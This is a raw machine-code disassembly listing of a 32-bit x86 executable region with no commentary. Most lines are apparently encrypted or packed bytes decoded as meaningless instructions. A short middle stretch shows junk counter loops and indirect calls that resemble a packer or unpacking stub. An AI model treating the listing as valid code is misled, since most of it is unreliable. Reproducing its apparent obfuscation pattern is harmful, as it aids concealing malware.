  40a1db:	pop    esi
  40a1dc:	fdivrp st(0),st
  40a1de:	aas    
  40a1df:	outs   dx,BYTE PTR ds:[esi]
  40a1e0:	mov    WORD PTR [ecx-0x7c869c7f],ds
  40a1e6:	sbb    edi,esp
  40a1e8:	ja     0x40a228
  40a1ea:	or     ah,BYTE PTR [edx+edi*8-0x3c374c76]
  40a1f1:	repz (bad) 
  40a1f4:	stos   DWORD PTR es:[edi],eax
  40a1f5:	mov    bl,0x66
  40a1f7:	adc    ebx,esp
  40a1f9:	push   ecx
  40a1fa:	mov    ch,dl
  40a1fc:	push   edx
  40a1fd:	fnstsw WORD PTR [esi]
  40a1ff:	add    al,0x81
  40a201:	fisttp DWORD PTR [edi-0x3392e51e]
  40a207:	mov    dl,ah
  40a209:	imul   esp,DWORD PTR [esp+edx*8],0x2f
  40a20d:	psubw  mm4,QWORD PTR [edx+0x444c3c03]
  40a214:	repnz mov ebx,0x21607c37
  40a21a:	jge    0x40a284
  40a21c:	inc    esp
  40a21d:	or     al,0xb0
  40a21f:	push   eax
  40a220:	push   ecx
  40a221:	xchg   esi,eax
  40a222:	cmp    eax,0x73ec2e3b
  40a227:	jle    0x40a28c
  40a229:	fcom   QWORD PTR [esi+0x6f]
  40a22c:	into   
  40a22d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a22e:	dec    edi
  40a22f:	push   ecx
  40a230:	rol    BYTE PTR [esp+edx*4-0x43b34425],1
  40a237:	stc    
  40a238:	int    0xea
  40a23a:	inc    edx
  40a23b:	iret   
  40a23c:	inc    ebp
  40a23d:	pop    esp
  40a23e:	inc    edi
  40a23f:	aaa    
  40a240:	pop    esi
  40a241:	jne    0x40a20d
  40a243:	and    eax,0x3bbb05e4
  40a248:	cmp    BYTE PTR [edi+0x16],0x2c
  40a24c:	adc    al,0x3f
  40a24e:	pop    ds
  40a24f:	add    al,0x55
  40a251:	xchg   edx,eax
  40a252:	cs adc al,0x58
  40a255:	cmp    eax,0x5fa5b08b
  40a25a:	ins    BYTE PTR es:[edi],dx
  40a25b:	sub    DWORD PTR [edx+0x67],edx
  40a25e:	pushf  
  40a25f:	int    0x42
  40a261:	ins    BYTE PTR es:[edi],dx
  40a262:	das    
  40a263:	adc    edi,DWORD PTR [edx+0x13]
  40a266:	stc    
  40a267:	stos   BYTE PTR es:[edi],al
  40a268:	cmp    ebx,DWORD PTR [ecx+ebp*8-0x32]
  40a26c:	mov    bh,0xfa
  40a26e:	add    ecx,edi
  40a270:	ja     0x40a200
  40a272:	rcr    DWORD PTR [edx+0x7e],cl
  40a275:	mov    ah,0x22
  40a277:	sub    BYTE PTR [esi-0x7f86b8e6],0xc9
  40a27e:	xchg   ecx,eax
  40a27f:	sbb    ecx,DWORD PTR [eax]
  40a281:	add    eax,0x68ba601a
  40a286:	arpl   cx,si
  40a288:	bnd jge 0x40a295
  40a28b:	shl    BYTE PTR [ecx-0x395056cd],cl
  40a291:	stos   BYTE PTR es:[edi],al
  40a292:	mov    edi,esp
  40a294:	push   0x45e31760
  40a299:	cmp    eax,0x269508d1
  40a29e:	inc    esp
  40a29f:	fs mov bl,0x3d
  40a2a2:	push   es
  40a2a3:	cmp    edi,DWORD PTR [ebp-0x471a1580]
  40a2a9:	add    eax,0xafcf9ae4
  40a2ae:	or     eax,0xc66c4ee1
  40a2b3:	es out 0x62,eax
  40a2b6:	pop    ss
  40a2b7:	inc    DWORD PTR [eax-0x14]
  40a2ba:	xchg   edx,ecx
  40a2bc:	lock (bad) 
  40a2be:	mov    ebp,0x4f522a19
  40a2c3:	push   ebx
  40a2c4:	xchg   esi,eax
  40a2c5:	adc    eax,0x5c90801c
  40a2ca:	mov    ch,0x25
  40a2cc:	std    
  40a2cd:	or     eax,0xd1a10ce2
  40a2d2:	test   al,0x97
  40a2d4:	out    0xeb,eax
  40a2d6:	pop    esp
  40a2d7:	mov    DWORD PTR [ebx+0x66],edx
  40a2da:	cmc    
  40a2db:	popf   
  40a2dc:	stc    
  40a2dd:	(bad)  
  40a2de:	mov    edi,0x53d666d8
  40a2e3:	arpl   WORD PTR [edi-0x1d],bx
  40a2e6:	outs   dx,DWORD PTR ds:[esi]
  40a2e7:	out    dx,eax
  40a2e8:	inc    ebp
  40a2e9:	imul   edx,DWORD PTR [esi],0xf99b071d
  40a2ef:	jbe    0x40a35e
  40a2f1:	rcl    BYTE PTR [edx+0x6],cl
  40a2f4:	imul   esi,DWORD PTR [eax+ebp*1],0xfffffff9
  40a2f8:	jno    0x40a359
  40a2fa:	push   DWORD PTR [eax-0x29]
  40a2fd:	fisttp QWORD PTR [eax+esi*2+0x5c5ef7cf]
  40a304:	jmp    0x3b44d989
  40a309:	daa    
  40a30a:	fld    TBYTE PTR [esi-0x45a57a14]
  40a310:	popf   
  40a311:	lds    edi,FWORD PTR [ebx-0x14cb01b5]
  40a317:	repnz popa 
  40a319:	xor    eax,0xeec3c7bf
  40a31e:	xlat   BYTE PTR ds:[ebx]
  40a31f:	out    0x1f,eax
  40a321:	loop   0x40a2b6
  40a323:	cmp    DWORD PTR [esi-0x71],ecx
  40a326:	outs   dx,BYTE PTR ds:[esi]
  40a327:	sbb    al,0x47
  40a329:	in     eax,dx
  40a32a:	cmp    BYTE PTR [edx-0x20565464],ah
  40a330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a331:	ins    BYTE PTR es:[edi],dx
  40a332:	nop
  40a333:	jle    0x40a355
  40a335:	je     0x40a2ff
  40a337:	sub    BYTE PTR [ecx+eax*2+0x647e3fc7],dl
  40a33e:	shl    DWORD PTR [esi+0x7a],0x37
  40a342:	fs or  edx,edx
  40a345:	test   eax,0x301eb65d
  40a34a:	sbb    al,0x7d
  40a34c:	push   esi
  40a34d:	xchg   esi,eax
  40a34e:	aad    0xf3
  40a350:	xchg   ebx,eax
  40a351:	test   al,bh
  40a353:	jnp    0x40a347
  40a355:	push   esp
  40a356:	sbb    ah,BYTE PTR [esi+0x8]
  40a359:	push   0x4a
  40a35b:	push   ebx
  40a35c:	mov    bl,BYTE PTR [ebx-0x4d]
  40a35f:	icebp  
  40a360:	out    0xdf,eax
  40a362:	ret    0xb2c1
  40a365:	add    edi,ecx
  40a367:	(bad)  
  40a368:	lods   eax,DWORD PTR ds:[esi]
  40a369:	fisttp WORD PTR [edi+0x43]
  40a36c:	ins    BYTE PTR es:[edi],dx
  40a36d:	xor    DWORD PTR [esi+0x13],eax
  40a370:	outs   dx,BYTE PTR ds:[esi]
  40a371:	sub    cl,BYTE PTR [esi+0x46e68a5]
  40a377:	jp     0x40a33a
  40a379:	fdiv   QWORD PTR ss:[esp+eiz*4-0x7c8db64e]
  40a381:	cmp    esp,eax
  40a383:	or     edx,DWORD PTR [edx]
  40a385:	stc    
  40a386:	sub    al,0x40
  40a388:	push   ebp
  40a389:	(bad)  
  40a38b:	nop
  40a38c:	mov    esi,0x60ae0b5e
  40a391:	or     DWORD PTR [eax+0x39],edx
  40a394:	loop   0x40a34e
  40a396:	xlat   BYTE PTR ds:[ebx]
  40a397:	inc    esp
  40a398:	mov    al,0x7e
  40a39a:	aam    0x3e
  40a39c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a39d:	xor    DWORD PTR [ebp+0x5],ebx
  40a3a0:	pushf  
  40a3a1:	xchg   BYTE PTR [esi+0x5f759a7b],dl
  40a3a7:	sbb    ebx,ecx
  40a3a9:	or     DWORD PTR [ecx],esi
  40a3ab:	dec    ecx
  40a3ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3ad:	test   DWORD PTR [eax],ebp
  40a3af:	pop    eax
  40a3b0:	ja     0x40a3ec
  40a3b2:	ins    DWORD PTR es:[edi],dx
  40a3b3:	xor    DWORD PTR ds:0x8c8807df,ecx
  40a3b9:	mov    esp,eax
  40a3bb:	jecxz  0x40a3d9
  40a3bd:	leave  
  40a3be:	sub    bh,dh
  40a3c0:	xchg   ch,dl
  40a3c2:	ror    BYTE PTR [ebx],cl
  40a3c4:	ins    BYTE PTR es:[edi],dx
  40a3c5:	mov    eax,0x20efb48
  40a3ca:	cld    
  40a3cb:	cs fcom st(7)
  40a3ce:	mov    ecx,0x4aa0f863
  40a3d3:	xor    BYTE PTR [eax],0x84
  40a3d6:	or     bl,BYTE PTR [edi+0x616d2c58]
  40a3dc:	dec    esp
  40a3dd:	ret    
  40a3de:	xchg   edx,eax
  40a3df:	jl     0x40a369
  40a3e1:	xor    DWORD PTR [ecx+eax*8+0x29965716],0xffffff8c
  40a3e9:	jmp    0x7a25:0x9d25ebc2
  40a3f0:	mov    dh,0xbf
  40a3f2:	dec    esi
  40a3f3:	stos   BYTE PTR es:[edi],al
  40a3f4:	ins    DWORD PTR es:[edi],dx
  40a3f5:	ins    BYTE PTR es:[edi],dx
  40a3f6:	in     eax,0xfa
  40a3f8:	jecxz  0x40a43b
  40a3fa:	cmp    BYTE PTR [edx],ch
  40a3fc:	shl    BYTE PTR [ebx+0x236d8318],0x94
  40a403:	fnstcw WORD PTR [ebp+0x7e]
  40a406:	xlat   BYTE PTR ds:[ebx]
  40a407:	test   eax,0xf2bc5dda
  40a40c:	xor    ebx,eax
  40a40e:	ss mov ch,0x2c
  40a411:	call   0x3798f84f
  40a416:	fiadd  DWORD PTR [ecx]
  40a418:	imul   ebp,DWORD PTR [ebp-0x2d],0xa9087fe0
  40a41f:	dec    edi
  40a420:	mov    ds:0x1c87574f,eax
  40a425:	mov    esp,0xc5412eab
  40a42a:	popf   
  40a42b:	xchg   ebp,eax
  40a42c:	mov    ebp,0xc47077ba
  40a431:	call   DWORD PTR [ecx-0x7c49baf5]
  40a437:	out    0x64,al
  40a439:	into   
  40a43a:	out    0xc,eax
  40a43c:	sbb    dl,ah
  40a43e:	int3   
  40a43f:	cmp    cl,ch
  40a441:	ins    BYTE PTR es:[edi],dx
  40a442:	lods   eax,DWORD PTR ss:[esi]
  40a444:	inc    ecx
  40a445:	pushf  
  40a446:	jecxz  0x40a41f
  40a448:	loopne 0x40a496
  40a44a:	stc    
  40a44b:	adc    edx,DWORD PTR [edx+0x3b]
  40a44e:	add    ch,BYTE PTR [eax-0x44e20531]
  40a454:	inc    ecx
  40a455:	out    dx,eax
  40a456:	stc    
  40a457:	(bad)  
  40a458:	cmp    edx,eax
  40a45a:	xchg   cl,ch
  40a45c:	jl     0x40a414
  40a45e:	sub    BYTE PTR [ebx-0x75bf1fa],0x4d
  40a465:	xchg   ecx,eax
  40a466:	pop    ds
  40a467:	outs   dx,DWORD PTR ds:[esi]
  40a468:	sbb    DWORD PTR [ebx+0x72b8478f],ecx
  40a46e:	dec    esi
  40a46f:	cmp    ebp,eax
  40a471:	lods   eax,DWORD PTR ds:[esi]
  40a472:	mov    ds:0x48922900,eax
  40a477:	test   al,0x5a
  40a479:	(bad)  [edi]
  40a47b:	lods   al,BYTE PTR ds:[esi]
  40a47c:	mov    eax,ds:0x12c7eef
  40a481:	pusha  
  40a482:	adc    DWORD PTR [ebx-0x7a3d1a4d],edi
  40a488:	push   ecx
  40a489:	retf   0xc98a
  40a48c:	cmp    eax,0x367ede20
  40a491:	sub    dl,dl
  40a493:	mov    edi,0x468f3a88
  40a498:	aaa    
  40a499:	mov    dl,0x21
  40a49b:	dec    esp
  40a49c:	xchg   BYTE PTR [edi*8+0x5e5650de],cl
  40a4a3:	sbb    BYTE PTR [eax+0x1],ch
  40a4a6:	jnp    0x40a42a
  40a4a8:	sub    eax,0x3b9465b0
  40a4ad:	mov    ?,ecx
  40a4af:	(bad)  
  40a4b0:	stc    
  40a4b1:	push   ds
  40a4b2:	loop   0x40a519
  40a4b4:	cli    
  40a4b5:	je     0x40a4bb
  40a4b7:	fiadd  WORD PTR [edi-0x23ba72a5]
  40a4bd:	and    DWORD PTR ds:0x42a7cd,0x42a7f5
  40a4c7:	mov    DWORD PTR [ebp-0x28],eax
  40a4ca:	sub    DWORD PTR ds:0x42a889,0x30d0
  40a4d4:	mov    eax,DWORD PTR [ebp+0x8]
  40a4d7:	or     ecx,0x3ba0
  40a4dd:	mov    DWORD PTR [ebp-0x20],eax
  40a4e0:	and    DWORD PTR ds:0x42a771,0x0
  40a4ea:	mov    ecx,DWORD PTR ds:0x42a771
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42a771,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42a771,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42a771,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42a771
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42a771,ecx
  40a527:	cmp    DWORD PTR ds:0x42a771,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42a79d
  40a53e:	mov    ecx,DWORD PTR ds:0x42a851
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42a881,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42a881
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42a881,ebx
  40a56d:	cmp    DWORD PTR ds:0x42a881,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42a881,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42a849,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42a849
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42a849,ebx
  40a5af:	cmp    DWORD PTR ds:0x42a849,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42aa62
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42a849,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42a849
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42a849,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42a849,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2+0x40],dh
  40a61b:	das    
  40a61c:	mov    ebx,0x78fede61
  40a621:	js     0x40a697
  40a623:	jle    0x40a69d
  40a625:	js     0x40a615
  40a627:	(bad)  
  40a629:	pop    ds
  40a62a:	pop    eax
  40a62b:	retf   0x9eb8
  40a62e:	mov    WORD PTR [ecx+0x3515ad2c],ds
  40a634:	cs add al,0xe5
  40a637:	loopne 0x40a636
  40a639:	sahf   
  40a63a:	test   BYTE PTR [ecx+0x2431f968],dl
  40a640:	push   edi
  40a641:	(bad)  
  40a642:	mov    bl,0x5a
  40a644:	adc    al,BYTE PTR [esi-0xc81aa61]
  40a64a:	mov    ds:0x31b77f53,al
  40a64f:	mov    cl,0x3d
  40a651:	sub    al,0x7b
  40a653:	or     ch,BYTE PTR [eax]
  40a655:	fisub  DWORD PTR [ecx+0x8516372]
  40a65b:	adc    bl,dl
  40a65d:	ins    BYTE PTR es:[edi],dx
  40a65e:	mov    bp,0x742f
  40a662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a663:	arpl   WORD PTR [eax],cx
  40a665:	fst    QWORD PTR [ebx+0x2d99ba48]
  40a66b:	int3   
  40a66c:	test   BYTE PTR [ebx],ch
  40a66e:	lods   eax,DWORD PTR ds:[esi]
  40a66f:	stc    
  40a670:	in     eax,dx
  40a671:	stos   BYTE PTR es:[edi],al
  40a672:	mov    bh,bl
  40a674:	adc    eax,0xedf8d3e
  40a679:	add    ecx,DWORD PTR [eax+0x7c]
  40a67c:	aaa    
  40a67d:	fdiv   DWORD PTR [ebp-0x1774ee44]
  40a683:	out    dx,al
  40a684:	hlt    
  40a685:	push   cs
  40a686:	mov    ch,0x87
  40a688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a689:	inc    ebp
  40a68a:	imul   ebp,DWORD PTR [eax],0x86cb667e
  40a690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a691:	loop   0x40a69b
  40a693:	cmp    BYTE PTR [ebx-0x28],bh
  40a696:	or     al,0xa3
  40a698:	loop   0x40a698
  40a69a:	(bad)  
  40a69b:	cmp    DWORD PTR [ecx+0x4e],esp
  40a69e:	loop   0x40a702
  40a6a0:	xor    al,0x2e
  40a6a2:	dec    ebp
  40a6a3:	mov    ebx,0x1855771
  40a6a8:	ffreep st(2)
  40a6aa:	test   eax,0x6fb971b0
  40a6af:	loope  0x40a6e5
  40a6b1:	adc    BYTE PTR [ecx-0x6f],0xb3
  40a6b5:	push   eax
  40a6b6:	mov    ebp,0x6dfc7b71
  40a6bb:	xchg   dh,bh
  40a6bd:	mov    edi,0xb5e81976
  40a6c2:	or     DWORD PTR [edx+0x24],esi
  40a6c5:	outs   dx,DWORD PTR ds:[esi]
  40a6c6:	mov    ds:0x31f7247f,eax
  40a6cb:	jnp    0x40a6f0
  40a6cd:	(bad)  [edx+0x64]
  40a6d0:	sar    DWORD PTR [ebp+0x2a],cl
  40a6d3:	int3   
  40a6d4:	jnp    0x40a6fa
  40a6d6:	push   ss
  40a6d7:	data16 shr BYTE PTR [edx],1
  40a6da:	outs   dx,DWORD PTR ds:[esi]
  40a6db:	repnz outs dx,BYTE PTR ds:[esi]
  40a6dd:	je     0x40a695
  40a6df:	push   esi
  40a6e0:	mov    ebp,0x7bf41555
  40a6e5:	xchg   DWORD PTR [esi+0x66],ebp
  40a6e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6e9:	and    eax,0x79144568
  40a6ee:	mul    BYTE PTR [esi+0x14]
  40a6f1:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6f3:	fadd   DWORD PTR [edi+0x68]
  40a6f6:	mov    eax,ds:0xe86a0ee3
  40a6fb:	jns    0x40a76b
  40a6fd:	cmp    al,0x4d
  40a700:	icebp  
  40a701:	cmc    
  40a702:	sub    dl,BYTE PTR [edi+0x6d]
  40a705:	leave  
  40a706:	fimul  WORD PTR cs:[ebx+eax*2+0x5c]
  40a70b:	in     al,dx
  40a70c:	adc    eax,0x9e577036
  40a711:	std    
  40a712:	mov    edi,DWORD PTR [esi]
  40a714:	stos   BYTE PTR es:[edi],al
  40a715:	retf   0x5792
  40a718:	push   ebp
  40a719:	call   0x3513:0xa7865669
  40a720:	loopne 0x40a6e9
  40a722:	pop    ss
  40a723:	iret   
  40a724:	lock js 0x40a724
  40a727:	jmp    0x90a5:0x6e28391a
  40a72e:	jne    0x40a76f
  40a730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a731:	pop    ebx
  40a732:	cmp    al,0x74
  40a734:	push   0xffffffc3
  40a736:	push   0xdc2dec3
  40a73b:	fidiv  WORD PTR [edx-0x1f]
  40a73e:	mov    bh,0xe8
  40a740:	xor    eax,0xb27ed153
  40a745:	mov    ch,0xaf
  40a747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a748:	push   edx
  40a749:	call   0xb93dd76c
  40a74e:	push   ds
  40a74f:	fistp  QWORD PTR [ebx]
  40a751:	out    dx,al
  40a752:	add    BYTE PTR ds:0x9fe314,dl
  40a758:	add    eax,0x301b1da8
  40a75d:	ja     0x40a785
  40a75f:	cld    
  40a760:	add    eax,esp
  40a762:	inc    eax
  40a763:	adc    edi,DWORD PTR [eax-0x15]
  40a766:	rcr    BYTE PTR [ebx-0x43],0x84
  40a76a:	(bad)  
  40a76b:	push   ecx
  40a76c:	cdq    
  40a76d:	push   esp
  40a76e:	push   ebx
  40a76f:	add    DWORD PTR [esi-0x487db020],ebp
  40a775:	sbb    ebx,DWORD PTR [ebx]
  40a777:	bound  edx,QWORD PTR [esi]
  40a779:	inc    edi
  40a77a:	popa   
  40a77b:	sub    BYTE PTR [eax],0xa3
  40a77e:	push   ebx
  40a77f:	and    BYTE PTR [eax+0x53bf16c],bh
  40a785:	ror    BYTE PTR [eax],cl
  40a787:	ins    BYTE PTR es:[edi],dx
  40a788:	xor    al,0x5f
  40a78a:	aaa    
  40a78b:	cs call edx
  40a78e:	into   
  40a78f:	imul   esp,DWORD PTR [edx+0x7e],0xffffff8e
  40a793:	popf   
  40a794:	or     BYTE PTR [edi-0xa],ah
  40a797:	out    dx,al
  40a798:	(bad)  
  40a799:	jmp    0x40a727
  40a79b:	jo     0x40a7d0
  40a79d:	iret   
  40a79e:	mov    esp,0x1c462614
  40a7a3:	ss jae 0x40a73c
  40a7a6:	xchg   esi,eax
  40a7a7:	dec    eax
  40a7a8:	mov    edi,0x5aee2810
  40a7ad:	popf   
  40a7ae:	xchg   esp,eax
  40a7af:	jl     0x40a74a
  40a7b1:	mov    ds:0x2ebe4d9f,al
  40a7b6:	mov    ecx,0x4db0f529
  40a7bb:	add    BYTE PTR [eax-0x12eb6b42],0x80
  40a7c2:	(bad)  
  40a7c3:	jl     0x40a826
  40a7c5:	dec    ecx
  40a7c6:	stos   BYTE PTR es:[edi],al
  40a7c7:	in     al,0xb
  40a7c9:	add    BYTE PTR [edi-0x3da71527],0xa2
  40a7d0:	mov    edx,0xbe33bb1f
  40a7d5:	(bad)  
  40a7d6:	ror    esp,cl
  40a7d8:	and    ch,al
  40a7da:	shr    BYTE PTR [eax-0x40c5e6f2],0x81
  40a7e1:	mul    DWORD PTR [ecx+0x16a5d0bb]
  40a7e7:	pushf  
  40a7e8:	fwait
  40a7e9:	or     al,BYTE PTR [ebx]
  40a7eb:	push   ebx
  40a7ec:	and    eax,0x63fb8baa
  40a7f1:	fidivr DWORD PTR [esi+ebp*2-0x71]
  40a7f5:	sbb    BYTE PTR [ebp+0x58],al
  40a7f8:	cmp    edi,esp
  40a7fa:	sub    BYTE PTR [ebx+edx*4+0x21],0x69
  40a7ff:	lahf   
  40a800:	ja     0x40a7cd
  40a802:	inc    ecx
  40a803:	pop    edx
  40a804:	(bad)  
  40a805:	(bad)  [eax+0x74]
  40a808:	cmp    ebp,edi
  40a80a:	push   ds
  40a80b:	and    eax,0x1c61b4e8
  40a810:	mov    al,0x8c
  40a812:	adc    edi,eax
  40a814:	loope  0x40a800
  40a816:	test   DWORD PTR [edx+ecx*1+0x6fabc651],eax
  40a81d:	jmp    0xd6fa:0xde68929c
  40a824:	enter  0x4f10,0x1c
  40a828:	out    0xde,al
  40a82a:	lock int 0x54
  40a82d:	push   ds
  40a82e:	xor    al,0x31
  40a830:	call   FWORD PTR [edx+0x2f7094b8]
  40a836:	retf   0xce15
  40a839:	or     ebx,DWORD PTR [edi+0x68]
  40a83c:	xor    DWORD PTR [ecx+0x14],ecx
  40a83f:	xlat   BYTE PTR ds:[ebx]
  40a840:	push   ecx
  40a841:	adc    eax,DWORD PTR [ebp+0x2c]
  40a844:	mov    ah,0x6c
  40a846:	lods   al,BYTE PTR ds:[esi]
  40a847:	mov    DWORD PTR [eax],eax
  40a849:	adc    al,0x67
  40a84b:	push   edi
  40a84c:	pop    edi
  40a84d:	mov    dh,ch
  40a84f:	dec    esi
  40a850:	sbb    al,0xe4
  40a852:	ret    0xacf1
  40a855:	inc    edi
  40a856:	or     al,0x8b
  40a858:	les    ebx,FWORD PTR [esi-0x4f166f46]
  40a85e:	jno    0x40a7fe
  40a860:	jbe    0x40a8db
  40a862:	pop    es
  40a863:	mov    ds:0x6eafa7f2,al
  40a868:	cmp    DWORD PTR [ebx-0x4cdaa24c],ebp
  40a86e:	imul   esi,DWORD PTR [eax+0x6fd83638],0xb220d547
  40a878:	mov    cl,0x22
  40a87a:	push   esi
  40a87b:	jno    0x40a862
  40a87d:	jbe    0x40a8f5
  40a87f:	pop    esi
  40a880:	out    dx,eax
  40a881:	jle    0x40a8d1
  40a883:	mov    esi,0xcde6c53
  40a888:	fisub  WORD PTR [esi+0x433e59b7]
  40a88e:	(bad)  
  40a892:	push   esp
  40a893:	test   BYTE PTR [ebx+0x82b581f],dh
  40a899:	xor    DWORD PTR [edi+0x1a],0xebbe9a56
  40a8a0:	cld    
  40a8a1:	or     al,ah
  40a8a3:	push   ecx
  40a8a4:	idiv   DWORD PTR [ebp+0x3d1dab9e]
  40a8aa:	aad    0x7e
  40a8ac:	dec    ebx
  40a8ad:	mov    ecx,0x218fe039
  40a8b2:	cmp    dh,bh
  40a8b4:	jge    0x40a85c
  40a8b6:	ins    BYTE PTR es:[edi],dx
  40a8b7:	idiv   ebx
  40a8b9:	sub    eax,0xb2ca0491
  40a8be:	sbb    esi,edi
  40a8c0:	iret   
  40a8c1:	lds    esp,FWORD PTR [ecx]
  40a8c3:	xchg   edi,eax
  40a8c4:	fld    QWORD PTR [edi+eax*4]
  40a8c7:	shl    BYTE PTR [esp+eax*4],1
  40a8ca:	(bad)  
  40a8cb:	sti    
  40a8cc:	fdivrp st(3),st
  40a8ce:	add    BYTE PTR [edx+0x23bd67f8],bh
  40a8d4:	fstp   QWORD PTR [esi+ecx*1-0x52]
  40a8d8:	ss sti 
  40a8da:	push   eax
  40a8db:	out    dx,al
  40a8dc:	and    esi,DWORD PTR ds:0x760c44d7
  40a8e2:	int    0x15
  40a8e4:	jo     0x40a88b
  40a8e6:	stc    
  40a8e7:	arpl   WORD PTR [ebp-0x1151ce07],cx
  40a8ed:	out    dx,eax
  40a8ee:	iret   
  40a8ef:	sbb    DWORD PTR [eax-0x36],edx
  40a8f2:	and    BYTE PTR [ebp-0x73],0x2b
  40a8f6:	repnz repz pop es
  40a8f9:	mov    cl,0xe0
  40a8fb:	idiv   BYTE PTR [esi]
  40a8fd:	sbb    bl,BYTE PTR [eax]
  40a8ff:	fwait
  40a900:	bound  edi,QWORD PTR [eax+0x7a]
  40a903:	or     eax,0x6dea0371
  40a908:	(bad)
  40a90b:	fmul   DWORD PTR [ebx-0x5f]
  40a90e:	xchg   bx,ax
  40a910:	or     eax,0xbe859e21
  40a915:	push   esp
  40a916:	les    edx,FWORD PTR [edx-0x2]
  40a919:	add    al,0xb8
  40a91b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a91c:	in     eax,0xd
  40a91e:	ins    DWORD PTR es:[edi],dx
  40a91f:	cmp    esp,DWORD PTR [edi+ecx*1-0x77]
  40a923:	cmp    BYTE PTR [ebx+0x5d8bec45],cl
  40a929:	clc    
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    DWORD PTR [ebx+0x4b],ebp
  40a949:	and    BYTE PTR [edx-0x26],dh
  40a94c:	cmp    DWORD PTR [eax+0x78],0x74
  40a950:	jle    0x40a9ca
  40a952:	js     0x40a98d
  40a954:	push   ss
  40a955:	xchg   edi,eax
  40a956:	test   DWORD PTR [ecx+eiz*4],esp
  40a959:	into   
  40a95a:	icebp  
  40a95b:	stc    
  40a95c:	mov    eax,0x2648b7
  40a961:	aam    0xc
  40a963:	push   ebx
  40a964:	sub    dh,ch
  40a966:	and    DWORD PTR [edi],0xffffffdc
  40a969:	dec    DWORD PTR [ebx+0x6f]
  40a96c:	cmp    edi,DWORD PTR ds:0x8b7a6e3
  40a972:	out    dx,al
  40a973:	sub    eax,0x47fc1aa6
  40a978:	push   0x7289a49b
  40a97d:	neg    esp
  40a97f:	stos   BYTE PTR es:[edi],al
  40a980:	jl     0x40a913
  40a982:	out    0x8b,al
  40a984:	(bad)  [edi+ecx*1-0x4a416d00]
  40a98b:	popa   
  40a98c:	cdq    
  40a98d:	jmp    0x94238637
  40a992:	ja     0x40a96b
  40a994:	inc    ecx
  40a995:	push   edx
  40a996:	or     eax,DWORD PTR [edi+0x4c]
  40a999:	ja     0x40a96d
  40a99b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a99c:	jp     0x40aa14
  40a99e:	jo     0x40a99d
  40a9a0:	into   
  40a9a1:	int3   
  40a9a2:	push   0xf
  40a9a4:	mov    eax,ds:0x5f38871e
  40a9a9:	adc    DWORD PTR [ebp+0x5a],ebp
  40a9ac:	sub    esp,esi
  40a9ae:	mov    eax,esi
  40a9b0:	or     eax,0xdb8c3be7
  40a9b5:	shl    cl,cl
  40a9b7:	xchg   BYTE PTR [ebx-0x586b4757],ah
  40a9bd:	les    eax,FWORD PTR [ebx]
  40a9bf:	loope  0x40a9c7
  40a9c1:	push   ss
  40a9c2:	in     eax,0xd0
  40a9c4:	loope  0x40a975
  40a9c6:	test   al,0x1a
  40a9c8:	push   edx
  40a9c9:	xchg   ebp,eax
  40a9ca:	out    dx,al
  40a9cb:	out    dx,al
